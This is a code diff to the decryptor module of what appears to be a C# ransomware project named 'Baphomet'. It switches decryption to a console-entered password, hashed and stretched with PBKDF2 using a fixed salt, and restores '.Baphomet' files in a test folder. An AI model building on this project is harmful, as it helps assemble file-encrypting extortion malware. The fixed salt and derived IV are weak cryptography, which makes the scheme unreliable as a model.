@@ -10,15 +10,18 @@ namespace Baphomet
     public class Decrypt
     {
 
-        public static void decryptConfirm(SymmetricAlgorithm aes)
+        public static void decryptConfirm()
         {
             var userName = Environment.UserName;
             var userDir = "C:\\Users\\" + userName;
-            directoryRoad(userDir,aes);
+            directoryRoad(userDir);
         }
 
-        static void directoryRoad(string userDir, SymmetricAlgorithm aes)
+        static void directoryRoad(string userDir)
         {
+            Console.WriteLine("Enter your key here:");
+            string passsword = Console.ReadLine();
+
             var targetPath = userDir + "\\Desktop\\test";
             var extensionCheck = new[] { ".Baphomet" };
 
@@ -30,43 +33,52 @@ namespace Baphomet
                 var extension = Path.GetExtension(files[i]);
                 if (extensionCheck.Contains(extension))
                 {
-                    decryptFileData(files[i], targetPath, aes);
+                    decryptFileData(files[i], passsword);
                 }
             }
         }
 
-        static void decryptFileData(string file, string path, SymmetricAlgorithm aes)
+        static void decryptFileData(string file, string password)
         {
-          //  Console.WriteLine("Enter your key here:");
-          //  string strKey = Console.ReadLine();
 
             byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
-            // byte[] passwordBytes = Encoding.UTF8.GetBytes(strKey);
-          //  byte[] key = Convert.FromBase64String(strKey);
+            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
 
-            byte[] bytesDecrypted = decryptFileByte(bytesToBeDecrypted, aes);
+            byte[] bytesDecrypted = decryptFileByte(bytesToBeDecrypted, passwordBytes);
+
+            File.WriteAllBytes(file, bytesDecrypted);
             var extension = Path.GetExtension(file);
             var result = file.Substring(0, file.Length - extension.Length);
             System.IO.File.Move(file, result);
         }
 
 
-        static byte[] decryptFileByte(byte[] bytesToBeDecrypted, SymmetricAlgorithm aes)
+        static byte[] decryptFileByte(byte[] bytesToBeDecrypted, byte[] passwordBytes)
         {
             byte[] decryptedBytes = null;
-            ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
+            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
 
             using (MemoryStream ms = new MemoryStream())
             {
-              
-                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Write))
+                using (SymmetricAlgorithm aes = new AesManaged())
                 {
-                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
-                    cs.Close();
-                }
-                decryptedBytes = ms.ToArray();
+                    aes.KeySize = 256;
+                    aes.BlockSize = 128;
 
-               
+                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                    aes.Key = key.GetBytes(aes.KeySize / 8);
+                    aes.IV = key.GetBytes(aes.BlockSize / 8);
+
+                    aes.Mode = CipherMode.CBC;
+                    using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
+                        cs.Close();
+                    }
+                    decryptedBytes = ms.ToArray();
+
+                }
             }
             return decryptedBytes;
         }
